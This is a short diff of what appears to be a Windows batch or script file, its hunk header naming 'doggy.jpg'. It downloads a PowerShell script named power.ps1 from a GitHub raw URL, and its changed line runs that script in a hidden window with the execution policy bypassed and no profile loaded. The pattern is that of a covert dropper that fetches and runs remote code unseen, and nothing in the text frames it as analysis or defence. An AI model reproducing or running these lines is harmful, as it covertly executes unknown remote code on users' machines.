@@ -6,4 +6,4 @@ doggy.jpg
 
 powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/tahasim/HWI/refs/heads/main/power.ps1 -OutFile .\power.ps1;
 
-start PowerShell -windowstyle hidden -NoProfile -ExecutionPolicy Bypass -file "power.ps1"
+start /B powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File "power.ps1"
